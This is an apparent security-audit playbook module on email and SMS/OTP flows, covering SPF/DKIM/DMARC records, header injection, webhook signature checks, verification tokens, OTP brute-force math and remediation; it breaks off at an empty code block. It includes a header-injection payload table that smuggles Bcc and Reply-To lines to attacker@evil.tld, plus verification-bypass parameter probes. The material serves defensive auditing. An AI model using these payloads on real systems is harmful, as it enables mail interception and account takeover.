---
name: email-sms-checks
description: Audit playbook module for email and SMS/OTP flows, covering outbound spoofing protection evidence (SPF/DKIM/DMARC artifacts), sending-infrastructure and notification-content injection, inbound-mail processing attack surface, verification and magic-link bypasses, and OTP/SMS brute-force, enumeration, and abuse controls.
category_slug: MAIL
cwe: [CWE-93, CWE-203, CWE-307, CWE-345, CWE-640]
owasp: A07:2021 – Identification and Authentication Failures
---

## Scope & Objectives

### Objective

Audit every code path and repository artifact that sends mail or SMS, receives mail or ESP webhooks, mints or consumes email-verification tokens, magic links, or OTP codes, and every flow that changes a user's email address or phone number. For each finding produce: file:line evidence of the flawed construction, a static-first reproduction recipe, a severity with rationale, and a framework-correct fix. DNS-level conclusions drawn from repo artifacts must be labeled as artifact-based; live DNS confirmation is marked requires-network.

### In Scope

| Class | Typical finding | Primary CWE |
|---|---|---|
| Outbound spoofing protection | No SPF record artifact, `+all`/`?all` terminator, include-chain bloat past 10 lookups, no DKIM selector rotation evidence, DMARC absent or frozen at `p=none` forever on auth-email domains | CWE-345 |
| Sending-infrastructure markers | SMTP/provider credentials in code or config (pointer -> SECRETS module), user-controlled display-From enabling phishing-via-your-product, Reply-To hijack in notifications | CWE-93 |
| Notification-content injection | CR/LF smuggled into To/Cc/Bcc/Subject/custom headers via user input; header splitting adds recipients or injects a body | CWE-93 |
| Inbound email processing | Attachment parsers fed untrusted MIME (pointers -> FILE / DESER modules), auto-link-clicker/bot processors fetching extracted links (SSRF -> SSRF module), stale parsing libraries, unsigned inbound ESP webhooks consumed as trusted | CWE-345 |
| Verification & magic-link flows | Predictable verification tokens, GET endpoints with state-changing side effects (-> API module), feature-gating gaps for unverified accounts, magic-link tokens failing reset-grade hygiene (-> AUTHN module) | CWE-640 |
| OTP/SMS authentication | Weak RNG code generation, missing single-use/expiry/attempt-cap matrix, number-enumeration response oracles, SMS pumping fraud exposure, SIM-swap exposure honesty | CWE-307, CWE-203 |
| Contact-change UX traps | OTP or token delivered in URL query strings that land in logs/history, resend-button flood, old contact released before new contact verified | CWE-640 |

### Out of Scope (cross-references)

- Password-reset mechanics and MFA-factor hierarchy depth -> AUTHN module. This module flags only flow-specific deltas where email/SMS delivery is the transport.
- Hardcoded SMTP/API credential inventory technique -> SECRETS module. Flag presence here with a one-line pointer only.
- Attachment parser deep-dive (file-type confusion, archive bombs) -> FILE and DESER modules. Point at the sink here.
- Link-fetch SSRF mechanics and allowlist design -> SSRF module. Point at extraction-to-fetch flow here.
- General request-parameter abuse, throttle-depth metrics, GET side-effect semantics -> API module.
- Generic injection classes beyond header context (SQLi, template SSTI) -> INJ module; XSS-in-browser depth -> WEB module. HTML-email phishing/layout risk is covered here only.
- CSPRNG primitive selection rationale across languages -> CRYPTO module; this module checks the call site near OTP/token generation.

### Operating Assumptions

Read-only access to the repository; no running instance is guaranteed. The sending domain's live DNS is usually outside the repo: treat Terraform/Ansible/DNS-zone files, runbooks, and docs as evidence and mark every DNS conclusion requires-network until confirmed with `dig`. Dynamic tests are permissible only against explicitly authorized environments and mailboxes you own. Static confirmation of source-to-sink flow is sufficient evidence for reporting.

## Mental Model

### Email Trust Is Three Independent Records Plus One Glue Rule

Outbound spoofing protection is decided by three DNS TXT records published for the sending domain, audited here from whatever artifacts the repo exposes:

1. **SPF** (`TXT` at the apex, value starts `v=spf1`) lists which servers may send using the domain in the envelope sender (Return-Path / MAIL FROM). The final `all` mechanism carries the policy strength:
   - `+all`: pass everything — record exists but protects nothing; worst shape.
   - `?all`: neutral — no assertion; equivalent to no enforcement signal.
   - `~all`: softfail — receivers may mark suspicious; common during rollout.
   - `-all`: hardfail — receivers should reject non-listed sources; the target end state.
   A bare `v=spf1 ... -all` with no other mechanisms permits nobody, silently blackholing legitimate senders.
   Mechanisms that require DNS queries (`include:`, `a`, `mx`, `ptr`, `exists:`, and a `redirect=` modifier) count against a hard limit of **10 lookups** per evaluation, including queries triggered inside nested includes. Bloat past the limit makes the record evaluate to a permanent error, which receivers typically treat as fail — legitimate mail breaks even though the record "exists".
2. **DKIM** (`TXT` at `<selector>._domainkey.<domain>`, containing `v=DKIM1; k=rsa; p=<base64 key material>`) attaches a cryptographic signature over message headers/body under the signing domain `d=`. Rotation means publishing a new selector while signing moves to it and the old selector stays resolvable during transition. In IaC this appears as `route53_record`-style resources named `selector._domainkey`; multiple coexisting selectors are normal, an absence of any selector artifact for a self-built sender is not.
3. **DMARC** (`TXT` at `_dmarc.<domain>`, e.g. `v=DMARC1; p=none; rua=mailto:dmarc@example.com`) tells receivers what to do when neither authenticated identity aligns with the visible From header, and where aggregate reports go. Policy progression discipline: `p=none` (monitor, collect `rua` reports) time-boxed -> `p=quarantine` (spam-folder) -> `p=reject`. A domain stuck at `p=none` indefinitely has monitoring theater, not enforcement.

The glue rule is **alignment**: DMARC passes if SPF's checked domain (envelope sender) *or* DKIM's `d=` domain aligns with the RFC5322 From domain the recipient sees. Under **relaxed** alignment (the default) the organizational domains must match — `mail.example.com` aligns with `example.com`. Under **strict** alignment the domains must be byte-identical. Do not over-claim: a message can carry valid SPF and valid DKIM and still fail DMARC when neither aligns with From; conversely one aligned pass is enough. Keep this conceptual framing exact when writing findings.

### The App Is Either a Sender, a Receiver, or Both

Sender-side risk concentrates in what the application lets influence: credentials (SECRETS), the choice between direct SMTP and provider API, the From/Reply-To construction, and header/template assembly of content. Receiver-side risk concentrates in trust decisions: webhook handlers that act before verifying, parsers fed raw MIME, and bots that fetch URLs found in attacker-supplied mail.

### Verification Flows Are Authentication Without a Password

Email verification, magic links, and OTP are all proof-of-possession schemes: the secret travels over a channel the user is assumed to control. Security reduces to four properties you read directly from code:

- **Entropy**: how large is the space? (6 digits = 10^6 = 1,000,000.)
- **Window**: how long does the secret live?
- **Single-use**: is it atomically consumed?
- **Attempts**: how many guesses before invalidation?

A flaw in any property converts to an authentication bypass; the math and lockout interplay are computed explicitly in this module, not hand-waved.

### Two Economic Attack Models Frame SMS

**Enumeration** uses response differences ("SMS sent" vs "number invalid") as a yes/no oracle over your user base. **SMS pumping** abuses the fact that every outbound SMS costs real money: an attacker triggers messages to premium/range numbers they share revenue on. Controls are format validation (E.164 strictness), per-user/per-day caps, blocked-range lists, and cost alerts at the provider — audit all four.

## What To Check

Work through the seven groups in order; each check names its evidence source and its fix direction (fix detail in Remediation).

### A. Outbound Spoofing Protection Artifacts

1. Locate every sending domain the app uses (From domains, bounce domains, provider-managed subdomains) from config, docs, and IaC.
2. For each, find SPF evidence: a `TXT` record artifact starting `v=spf1`. If absent from artifacts, flag "no SPF evidence in repo — confirm requires-network", not a confirmed miss.
3. Read the terminator: `+all` or `?all` = finding (protection void). `~all` = acceptable only if DMARC enforcement compensates or rollout is documented and time-boxed. `-all` = target state.
4. Count lookup-bearing mechanisms (`include:`, `a`, `mx`, `ptr`, `exists:`, plus `redirect=`), including those inside nested includes, against the 10-lookup limit; flag records near or over budget as fragile/broken.
5. Find DKIM selector artifacts (`<selector>._domainkey` TXT shapes); for self-built senders with none, flag missing signing evidence. Check for rotation traces (multiple selectors, dated names like `s2024a._domainkey`) and stale-signing risk when old selectors linger forever after key retirement.
6. Find DMARC evidence at `_dmarc`: policy present? Progression sane? A permanent `p=none` with no documented rollout plan is a Medium-class finding on any domain used for authentication email. Confirm `rua=` aggregate reporting is configured during monitoring phases.
7. Check alignment conceptually: if DKIM signs a provider domain (`d=provider.example`) while From shows the customer domain and no custom Return-Path exists, alignment may fail — note it as a deliverability/spoofing-risk observation to verify with live samples.

### B. Sending-Infrastructure Markers

1. Grep for SMTP/provider credentials in code and config; apply SECRETS module rules — one-line pointer in the report, do not duplicate its inventory technique.
2. Note direct-send vs provider-API choice: raw SMTP sockets or local MTA relay from app servers implies self-managed reputation and auth; provider SDK/API implies provider-side handling but introduces API-key blast radius. Record which model each flow uses.
3. Trace the From header construction: can users set display name or full From? If yes → phishing-via-your-product: attacker makes your trusted sender address deliver their phishing text. Flag user-controlled From/display-name as High on notification systems.
4. Trace Reply-To: notification systems that copy a user-supplied Reply-To into outbound mail let attackers aim victim replies at themselves (support-desk interception, invoice fraud). Flag unvalidated Reply-To passthrough.

### C. Inbound Email Processing Surface

1. Determine whether the app receives mail at all (inbound parse webhooks, support-ticket intake, mail-to-ticket bots). If not, mark this group N/A explicitly.
2. Where inbound MIME is parsed, point attachment parsing at FILE/DESER modules for deep review; here verify only that parsers are actively maintained versions — email-parsing libraries have a history of parser-confusion bugs, so pin-and-update discipline matters; flag frozen ancient parser deps.
3. Find auto-link clickers/bot processors that fetch URLs extracted from mail bodies; trace extraction -> fetch and hand off to SSRF module with file:line pointers.
4. Inbound ESP webhooks: locate handlers; check whether signature verification exists before trust. Provider schemes are generically HMAC-based (shared secret, signature in a request header, usually over the raw body, often with a timestamp enabling replay-window checks) — never assume specifics; audit what the code does: no verification = CWE-345 finding; verification without replay window = note; comparison via `==` instead of constant-time compare = CRYPTO-module pointer.
5. Verify webhook handlers do not act on unauthenticated payloads that mutate state (mark ticket resolved, unsubscribe user, trigger refunds).

### D. Verification & Magic-Link Flows

1. Read token minting: what material feeds the token? User ID, timestamp, sequential counter, short hash of known data = predictable = bypass. Expect ≥128 bits from a CSPRNG (cross-check CRYPTO module).
2. Check consumption semantics: single-use atomic delete/mark-used? Reusable tokens across multiple clicks extend exposure indefinitely.
3. Check expiry: verification links valid for days/months are reset-grade hygiene failures (mirror AUTHN thresholds).
4. Map feature gating for unverified accounts: build the endpoint x gate matrix (technique in Exploitation). Sensitive actions reachable pre-verification = finding; severity scales with action sensitivity (data export, PII change, invite-sending, payment).
5. Flag GET endpoints performing verification state changes (verify-on-clickout) — pointer -> API module for method-semantics depth; here flag the pattern and CSRF exposure.
6. Magic-link deltas vs password-reset hygiene (-> AUTHN): link entropy/expiry/single-use mirror reset-token rules; additionally flag links whose full secret sits in the URL query string where Referer leakage and log capture apply, and auto-login links that skip session re-binding.

### E. Notification-Content Injection

1. Trace every To/Cc/Bcc/Subject/Reply-To/custom-header field back to its input; any path from user input without CR/LF stripping is a header-injection sink (sink table in Taint Tracing).
2. Check template rendering of user content into HTML email bodies: limited JS execution in most clients, but phishing/layout attacks are real — pointer -> WEB module for XSS-in-browser framing; here assess impersonation/layout manipulation inside your legitimate-looking mail.

### F. OTP/SMS Authentication

1. Read code generation: RNG source (CSPRNG vs `Math.random`/`rand()` — cross-check CRYPTO module), length, charset; compute the real space (6 digits = 10^6).
2. Extract time-window constants and single-use consumption; fill the matrix (entropy/window/single-use/attempts) per flow.
3. Compute rate-limiting math: attempts-needed-vs-lockout interplay (calculator description in Patterns & Signatures); missing attempt caps on 6-digit codes = brute-forceable at scale.
4. Audit SMS pumping controls: E.164 strictness of number validation, per-user/per-day send caps, blocked-range list support, cost-alert wiring at the provider (generic — enable billing/cost webhooks where offered).
5. Test uniform-response rule statically: same response body/status for "sent" and "invalid number"; differing responses = enumeration oracle (CWE-203).
6. State SIM-swap honesty in findings: SMS-OTP is inherently weaker than TOTP/app-based factors; recommend factor upgrade path rather than pretending controls close the gap — hierarchy guidance -> AUTHN module.
7. Check OTP values against logging sinks (request logs, debug logs, analytics events) — SECRETS module logging rules apply; an OTP in a log line is a credential leak.

### G. Contact-Change & Verification UX Traps

1. Flag OTP/token delivery in URL query parameters of clickable links (auto-fillable codes land in browser history, server access logs, proxy logs). Prefer POST-form entry or single-use short-path links.
2. Check resend-button flood control (per-recipient cooldown + daily cap shared with the pumping caps).
3. Build the contact-change logic table: does changing email/phone require verifying the NEW contact before releasing the OLD? Old released early = recovery hijack (CWE-640); both active simultaneously without re-proof = account-takeover chain enabler.

### H. BEC/AiTM Awareness Surface

1. Executive display-name spoofing: external lookalike From display names and lookalike domains defeat SPF-blind recipients; flag absence of impersonation-warning/banner guidance on inbound mail.
2. Adversary-in-the-middle phish kits proxy real login pages and harvest session cookies, defeating basic OTP/TOTP MFA — this drives the WebAuthn/FIDO2 recommendation (factor hierarchy -> AUTHN module).
3. QR-code phishing ("quishing"): malicious QR images in emails bypass URL-scanning mail filters; include in awareness and gateway-policy notes.
4. Malicious auto-forwarding rules on compromised mailboxes: post-compromise hygiene check — flag absence of forwarding-rule audit/alerting guidance for hosted mailboxes.
5. Payment-detail change requests (bank account, payout destination) verified out-of-band via a known channel, plus dual approval — BEC is a process failure before it is a technical one.
6. Domain lockdown for non-sending properties: every parked/auxiliary domain you own publishes `v=spf1 -all`, DMARC `p=reject` with `rua`, and a null MX — silence is the spoofing target.
7. Publish MTA-STS and TLS-RPT records alongside SPF/DKIM/DMARC: enforce SMTP TLS and gain visibility into failing/intercepted mail paths.

### Master Flow Table

| Flow | Flaw | Detection marker | Fix |
|---|---|---|---|
| Outbound SPF | No record / `+all` / `?all` terminator | TF/DNS artifacts: `records = ["v=spf1 +all"]` or apex TXT missing while docs name a sending domain | Publish scoped `v=spf1 include:... -all`; stage via `~all` |
| Outbound SPF | Lookup bloat >10 queries | Long `include:` chains, nested includes, `mx a ptr` stacked | Flatten includes, drop `ptr`, use IP ranges, consolidate |
| Outbound DKIM | No selector artifact; stale selectors | No `<selector>._domainkey` resources for self-built sender; orphaned keys | Sign with managed selector; rotate; retire old keys after transition window |
| Outbound DMARC | Absent, or permanent `p=none` | No `_dmarc` record; `_dmarc ... p=none` with no rollout doc | Stage `p=none`+`rua` (time-boxed) -> `quarantine` -> `reject` |
| Notifications | User-controlled display-From/Reply-To | `from: req.body.name <noreply@...>` style concatenation | Server-fixed From; validated allowlisted Reply-To; strip CR/LF everywhere |
| Notifications | Header injection via To/Cc/Subject | CR/LF reachable from input into header params of send calls | Strip `[\r\n]` at boundary; validate addresses with stack parser |
| Inbound webhooks | Unsigned payload acted upon | Handler reads JSON body before any HMAC check; no timestamp/replay window | Verify-before-trust: constant-time HMAC over raw body + replay window |
| Inbound processing | Stale/stale-pinned MIME parsers | Ancient pinned parser dep, no update cadence | Keep parsers updated; treat parser-confusion advisories as patch-now |
| Email verification | Predictable token; reusable token; no expiry | Token minted from id/timestamp; lookup without consume; no TTL column read | CSPRNG ≥128-bit; atomic consume; ≤24h TTL (reset-grade) |
| Feature gating | Sensitive features work pre-verification | Route matrix shows export/PII-change reachable with `verified=false` | Gate sensitive routes on verified state server-side |
| Magic links | Reset-grade violations; URL-borne secret | Link contains full token in query string; long-lived; multi-click | Mirror AUTHN reset rules; POST-form delivery where feasible |
| OTP generation | Weak RNG, no single-use, long window | `Math.random` near otp; code not deleted post-check; 24h windows | CSPRNG; atomic consume; ~5-min expiry; 5-attempt cap then invalidate |
| SMS sending | Pumping exposure; enumeration oracle | No E.164 validation; no caps; distinct responses for invalid numbers | E.164 anchor regex; per-user/day caps; range blocklist; uniform errors |
| Contact change | Old contact released before new verified | Update commits immediately; no re-verification step | Verify NEW first; only then retire OLD; log both |

## Where To Look

Search order matters: infrastructure artifacts first (they establish which domains matter), then call sites, then flows. In the command column, `\|` is markdown-table escaping — replace with a plain `|` when running under ripgrep (rg alternation is unescaped `|`).

| Target | Why | Sample glob / command |
|---|---|---|
| Terraform/Pulumi/Ansible DNS zones | SPF/DKIM/DMARC record artifacts | `rg -n --hidden -g '*.tf' -g '*.yaml' 'v=spf1\|_domainkey\|_dmarc' .` |
| Route53/Cloud DNS record blocks | Canonical shapes for the three records | `rg -n -g '*.tf' 'aws_route53_record' -A8` then filter `type\s*=\s*"TXT"` |
| Mail config files/env templates | Sending domain, SMTP host, provider choice | `rg -n -g '*.env*' -g '*.yml' -g '*.ini' 'SMTP_\|MAIL_\|EMAIL_\|DKIM' .` |
| Send-call sites across stacks | Every outbound message origin | `rg -n '(?i)(send_mail\(\|\bmail\(\|sendEmail\|send_email\|sendMail\(|sendRawEmail\|\.send\()' --type-add 'code:*.{php,js,ts,py,java,go,rb,cs}' -tcode .` |
| nodemailer usage | Transport object field handling | `rg -n 'createTransport\|nodemailer' -g '*.{js,ts}' .` |
| SES/SESv2 SDK calls | Destination/Source construction | `rg -n '(?i)(sesv?\|simpleemail).{0,40}(sendEmail\|sendRawEmail\|send_)' -g '*.{js,ts,py,java,go}' .` |
| Other providers | Full sender inventory | `rg -n '(?i)sendgrid\|mailgun\|postmark\|sparkpost\|resend\|smtp' -g '!node_modules' .` |
| OTP/code generation | Entropy + RNG source | `rg -n '(?i)(otp\|one[_-]?time[_-]?code\|verification[_-]?code\|generate[_-]?code)' .` then inspect neighbors for randomness |
| Random near code vars | CSPRNG vs PRNG cross-check | `rg -n '(Math\.random\|random\.randint\|rand\(\)\|mt_rand)' -g '*.{js,py,php}' .` paired with `crypto.randomInt\|secrets\.` hits |
| Verification/magic-link minting | Predictability review | `rg -n '(?i)(verify\|magic\|confirm)[_-]?(token\|link)\|(signToken\|makeToken\|tokenFor)' .` |
| SMS SDK invocations | Number-source tracing | `rg -n '(?i)(twilio\|vonage\|messagebird\|plivo\|sns.*publish\|sendSms\|send_sms)' .` |
| Webhook receivers (inbound mail) | Verify-before-trust audit | `rg -n '(?i)(webhook\|inbound[-_]?mail\|mailgun/routes\|ses/notification\|postback)' -g '*.{js,py,rb,go,java}' .` |
| Email templates | User-content rendering into HTML mail | `ls **/templates/**/email* **/mailers/** **/emails/** 2>/dev/null` |
| Verification controllers/gating | Unverified-feature matrix inputs | `rg -n '(?i)is_verified\|email_verified\|verified_at\|phone_verified' .` |
| Docs/runbooks | Rollout phase evidence for DMARC exceptions | `rg -n -i 'dmarc\|spf\|dkim' docs/ *.md README* 2>/dev/null` |

Prioritize: auth-email sending domain config > verification/OTP code > notification From/Reply-To construction > inbound webhooks > template content.

## Patterns & Signatures

All regexes are ripgrep-compatible (PCRE2 where noted with `-P`). Run from repo root; exclude vendor trees (`-g '!node_modules' -g '!vendor'`).

### Signature Set

Same escaping rule as above: `\|` in a cell becomes `|` at the command line.

| # | Hunt | Regex | Notes |
|---|---|---|---|
| S1 | PHP native send | `(?i)\bmail\s*\(` | Third arg = additional headers; CR/LF there is the classic sink |
| S2 | Generic senders | `(?i)(send_mail\(\|sendEmail\(\|send_email\(\|sendMail\(\)` | Then trace each header-bound argument |
| S3 | nodemailer | `createTransport\(\|transporter\.sendMail\|require\(['"]nodemailer['"]\)` | Inspect options object fields `to/cc/bcc/subject/from/replyTo` |
| S4 | SES SDK | `(?i)(sendEmail\|sendRawEmail\|send_email)` near `\bsesv?\d?\b` | Check Destination/Source/ConfigurationSetName construction |
| S5 | Other ESPs | `(?i)sendgrid\|mailgun\|postmark\|sparkpost` | Same field-trace discipline |
| S6 | SMS sends | `(?i)(twilio\|vonage\|messagebird\|plivo\|snsclient\|sendsms\|send_sms)` | Trace the To number to its source |
| S7 | OTP generation | `(?i)(otp\|verification_code\|one_time_code\|gen_code)[^;\n]{0,120}` | Read ±10 lines around each hit for RNG calls |
| S8 | PRNG near code vars | `Math\.random\(\|random\.randint\|mt_rand\(\|\brand\(` within 5 lines of an otp/code variable (`-P`, use context flags or manual read) | Cross-check against CRYPTO module CSPRNG list |
| S9 | CSPRNG presence (contrast set) | `crypto\.randomInt\|randomBytes\|secrets\.(randbelow\|token_hex)\|SecureRandom\|crypto/rand` | Confirms correct source when present |
| S10 | Verification-token creation | `(?i)(verify\|magic\|confirm)[_-]?(token\|link)\|(urlsafe_token\|its\.sign\|jwt\.sign)` | JWT-signed verification tokens need alg/expiry review too |
| S11 | Header fields from input | `(?i)(to\|cc\|bcc\|subject\|reply.?to)['"]?\s*[:=]\s*[^;\n]*(req\.\|params\[\|body\.\|request\.\|userInput\|\$_)` | Candidate injection sinks |
| S12 | SPF/DKIM/DMARC artifacts | `v=spf1\|_domainkey\|_dmarc\|DMARC1` in tf/yaml/json/md | Artifact-based DNS evidence |
| S13 | Gating attributes | `(?i)is_verified\|email_verified_at\|verified_at\|phone_verified\|@Verified` | Feed the gating matrix |
| S14 | Webhook receivers | `(?i)(webhook\|inbound_mail\|mail_route\|notification_callback)` | Verify-before-trust audit entry points |

### IaC Config Shapes

```hcl
# VULNERABLE — SPF permits the world
resource "aws_route53_record" "spf" {
  zone_id = aws_route53_zone.primary.zone_id
  name    = "example.com."
  type    = "TXT"
  ttl     = 3600
  records = ["v=spf1 +all"]
}

# VULNERABLE — DMARC absent entirely, or monitoring forever:
resource "aws_route53_record" "dmarc" {
  zone_id = aws_route53_zone.primary.zone_id
  name    = "_dmarc.example.com."
  type    = "TXT"
  ttl     = 3600
  records = ["v=DMARC1; p=none"]   # no rua=, no progression plan -> monitoring theater
}
```

```hcl
# FIXED — scoped SPF with hard-fail terminator (lookup budget: include=1, ip4=0)
resource "aws_route53_record" "spf" {
  zone_id = aws_route53_zone.primary.zone_id
  name    = "example.com."
  type    = "TXT"
  ttl     = 3600
  records = ["v=spf1 include:_spf.provider.example ip4:203.0.113.10 -all"]
}

# FIXED — DKIM selector published for the signing key
resource "aws_route53_record" "dkim_sel1" {
  zone_id = aws_route53_zone.primary.zone_id
  name    = "sel1._domainkey.example.com."
  type    = "TXT"
  ttl     = 3600
  records = ["v=DKIM1; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A..."] # split >255-char strings into adjacent quoted chunks
}

# FIXED — DMARC enforced with reporting (staging variant: p=quarantine; pct=10 first)
resource "aws_route53_record" "dmarc" {
  zone_id = aws_route53_zone.primary.zone_id
  name    = "_dmarc.example.com."
  type    = "TXT"
  ttl     = 3600
  records = ["v=DMARC1; p=reject; rua=mailto:dmarc-reports@example.com"]
}
```

### SPF Lookup-Budget Worked Example

```
v=spf1 include:_spf.a.example include:_spf.b.example mx a ptr exists:check.example -all
      └─ +1                 └─ +1                        +1(mx) +1(a) +1(ptr) +1(exists)
```
Direct mechanisms consume 6 queries; if `_spf.a.example` itself contains two `include:`s, those nest and add 2 more → total 8 of 10 before any third-party additions. Records at ≥7 are fragile: flag them even when technically compliant.

### Payload Cheat-Sheet

Header-injection probes (URL-encoded variants first; raw CR/LF variants second):

| Field | Payload (encoded) | Effect observed |
|---|---|---|
| To | `victim@example.com%0ABcc:%20attacker@evil.tld` | Blind copy of message to attacker mailbox |
| To | `victim@example.com%0d%0aBcc:attacker@evil.tld` | CRLF pair variant |
| To | `victim@example.com%250aBcc:attacker@evil.tld` | Double-encoded — survives one decode layer |
| To | `victim@example.com\nBcc: attacker@evil.tld` (raw LF via API body) | JSON/API paths skip URL encoding |
| Subject | `Hello%0d%0aX-Sent-Via:%20injection-test` | Custom-header smuggle confirms sink reachability |
| Subject | `%0a%0a<p>Phishing body here</p>` | Blank line starts the body — content injection |
| Reply-To | `legit@example.com%0aReply-To:%20attacker@evil.tld` | Reply redirection |

Duplicate-parameter tricks on verification endpoints:

- `GET /verify?token=A&token=B` — frameworks differ on first-vs-last-wins and scalar-vs-array coercion; a validator reading occurrence 1 while the consumer reads occurrence 2 yields bypass windows.
- Mass-assignment attempts alongside token params: `?token=x&verified=true&status=active` — observe whether extra keys mutate state.
- Case/encoding duplicates: `?TOKEN=a&token=b`, `%54oken=a` — parser normalization mismatches.

OTP brute-force pacing calculator description (compute per flow, do not guess):

```
space S        = charset^length          # 6 digits => 10^6 = 1,000,000
window W       = expiry seconds          # e.g. 300 s
cap A          = max attempts allowed
p(success)     ≈ min(A, requests_possible)/S
requests_possible = request_rate × W     # e.g. 20 rps × 300 s = 6,000 tries
```

With no attempt cap: 6-digit OTP needs ~500k average guesses; at sustained 50 rps that is under 3 hours inside rolling windows — feasible. With a 5-attempt cap then invalidation: p ≈ 5×10^-6 per issued code — dead end. Report both numbers when caps are absent.

## Taint Tracing Guidance

**Sources**: user profile fields (name, email, phone), form/JSON bodies, query params, CSV/bulk imports, support-ticket content, anything stored by users and later merged into outbound mail.

**Propagation patterns to follow**: string concatenation/f-strings building header values (`"${name} <noreply@x>"`), array spreads into transport options, template variables placed into header positions rather than body positions, bulk-import loops feeding send functions, webhook payloads forwarded verbatim into notifications.

**Sanitizer recognition**: a helper stripping `[\r\n]` (both orders, both encodings after URL-decode) applied to every header-bound string marks the path clean; validators using stack-native address parsers (strict mode) also mark clean. Absence of either on a user-fed path = candidate finding.

### Email-Specific Sink Table

| Sink | Stack/API | Dangerous parameter | Note |
|---|---|---|---|
| Native mailer | PHP `mail($to,$subj,$body,$additional_headers)` | `$additional_headers` (and `$to`, `$subject`) | Classic header-splitting sink; strip CR/LF before any call |
| CMS wrapper | WordPress `wp_mail(...)` | Headers array/string entries | Wraps PHP mail/SMTP plugins; same CR/LF discipline |
| Node transport | nodemailer `sendMail({from,to,cc,bcc,subject,replyTo,headers})` | Any option fed user input | Do not rely on library version behavior for newline handling; sanitize at your boundary regardless |
| Python stdlib | `smtplib.sendmail(from_addr, to_addrs, msg)` | Address lists and pre-built msg bytes | No sanitization of caller-supplied strings; headers you build are yours |
| Django | `django.core.mail.send_mail(subject, ..., recipient_list)` / `EmailMessage(extra_headers=...)` | `extra_headers` values; address list entries | Subject newlines are converted to whitespace by Django's mail machinery and recipients go through address sanitization that rejects malformed values — risk concentrates in `extra_headers` and non-Django paths; still normalize inputs defensively |
| Java mail | `MimeMessage.setRecipient/setSubject/addHeader`; `InternetAddress` | Raw header strings; leniently parsed addresses | Use `new InternetAddress(value, true)` strict parsing plus `.validate()`, and pass parsed objects to recipients instead of raw strings |
| Go net/smtp | `smtp.SendMail(addr, auth, from, to, msg)` | Caller-built `msg` bytes and `to` slice | Library writes what you give it; build addresses through `net/mail.ParseAddress` and reject errors |
| Provider SDKs | SES Destination/Source, SendGrid personalization, Mailgun messages | Source/Destination/To/Reply-To fields | Same rule: server-fixed identity, validated recipients, stripped control chars |

**Webhook taint rule**: raw request body remains tainted until an HMAC verification over that exact byte sequence passes (constant-time compare). Any branch that parses or acts pre-verification is fully tainted; treat timestamp absence as replay-window loss, not a blocker finding unless state mutation exists.

## Exploitation & Reproduction

### Static Procedures

1. **Trace recipient/source fields to user input.** For every S1–S6 hit: identify each header-bound argument; walk backwards to its origin; classify as server-fixed, admin-set, or user-controlled. Record `file:line` chains. Expected observable: a table of send calls x input classification; findings where user-controlled values reach header positions without CR/LF stripping.
2. **Check verification-gating coverage across sensitive endpoints.** Enumerate routes (`rg -n '@(get|post|route|app\.(get|post))|path\(|router\.'`); list sensitive actions (data export, PII/profile change, invite/referral sending, payment methods, deletion). For each, locate the middleware/decorator/branch checking verification state (S13 markers). Build the endpoint x gate matrix. Expected observable: rows with no gate reference = pre-verification-reachable actions; verify by reading handler code, not just decorator presence.
3. **Read the OTP generator for RNG source + window constants.** At each S7 hit: identify the randomness call (S8 vs S9), length/charset → compute space, find expiry constants, consumption logic (delete/mark-used in same transaction?), attempt counter lifecycle (per-code? per-account? reset on resend?). Expected observable: the filled matrix entropy/window/single-use/attempts with file:line for each cell.
4. **Read verification-token minting.** At S10 hits: determine token material (CSPRNG? JWT? hash of id+timestamp?). If JWT-signed: check alg, expiry claim, and secret source pointer -> SECRETS. Predictability test: can you reconstruct a plausible token from public data (user id + registration timestamp)? Expected observable: minting recipe and a yes/no predictability verdict.
5. **Audit webhook handlers for verify-before-trust.** At S14 hits: locate signature-check code relative to body parse/action; check raw-body usage (HMAC over parsed-and-reserialized JSON fails silently against provider signatures — flag it), constant-time comparison, timestamp/replay window. Expected observable: order-of-operations diagram per handler with pass/fail.

### Dynamic Tests (Authorized Environments Only)

1. **Send-to-self header-injection probe.** Against an authorized staging instance, register an account whose display name or profile fields carry `%0ABcc:%20your-owned-mailbox@evil.tld` style payloads (use a mailbox you own), then trigger any notification to yourself. Inspect the received message's full headers in your mailbox. Expected observables: injection confirmed = smuggled `Bcc:` or custom header present in delivered mail, or delivery failure/bounce mentioning malformed headers; clean = payload appears only inside the body or display name verbatim.
2. **Uniform-response diff testing.** Submit "send OTP" for your real number/email vs an obviously invalid one vs a random valid-format-but-unregistered one; compare status codes, bodies, byte counts, and timing. Expected observables: enumeration oracle = distinguishable responses for registered vs unregistered inputs; compliant = identical response shape/status with near-equal timing.
3. **OTP lockout pacing test (~10 attempts).** Request a code, submit 10 deliberately wrong codes at a modest pace, recording when throttling or invalidation engages. Expected observables: healthy = attempts rejected past threshold and/or code invalidated before 10; broken = all 10 accepted as wrong answers with no throttle and code still alive.
4. **Resend-flood probe.** Hit resend 12 times within the cooldown window. Expected observable: requests beyond cap rejected or delayed; unbounded sends = flood/pumping exposure.
5. **Deliverability smoke test (post-fix, negative test).** Send legitimate transactional mail to major-provider inboxes you own after SPF/DKIM/DMARC changes; check inbox placement AND spam folder explicitly — DMARC policy flips affect reputation gradually, so absence of immediate spam-foldering is not proof of safety; re-test over several days. Requires-network.
6. **DNS confirmation.** `dig +short TXT example.com`, `dig +short TXT sel1._domainkey.example.com`, `dig +short TXT _dmarc.example.com`. Marked requires-network. Expected observable: record values matching repo artifacts; divergence between artifact and live DNS is itself a finding (drift).

## Remediation

### Staged SPF/DMARC Rollout Plan

1. **Inventory every sender** of the domain first: app servers, billing/invoicing systems, CRM, helpdesk, marketing platforms, monitoring alerts. Over-strict `-all` before inventory breaks third-party senders (billing dunning mail silently vanishing is the classic regression).
2. **Publish scoped SPF** listing exactly those sources; start terminator `~all`.
   `v=spf1 include:_spf.provider.example ip4:203.0.113.10 -all`
3. **Deploy DKIM signing** per sender; publish each selector; rotate keys on a schedule; keep old selectors resolvable through the transition window, then retire.
4. **DMARC monitor phase** (time-boxed, documented): `v=DMARC1; p=none; rua=mailto:dmarc-reports@example.com` — consume aggregate reports until legit-source inventory stabilizes (30–90 days typical).
5. **Enforcement ramp**: `v=DMARC1; p=quarantine; rua=mailto:dmarc-reports@example.com; pct=10` then raise `pct` to 100; finally `p=reject`. Keep `rua` permanently. Add `sp=` for subdomain policy when subdomains send.
6. Re-run the lookup-budget count after every include addition; flatten when ≥7 queries.

### Header-Sanitization Patterns Per Stack

```js
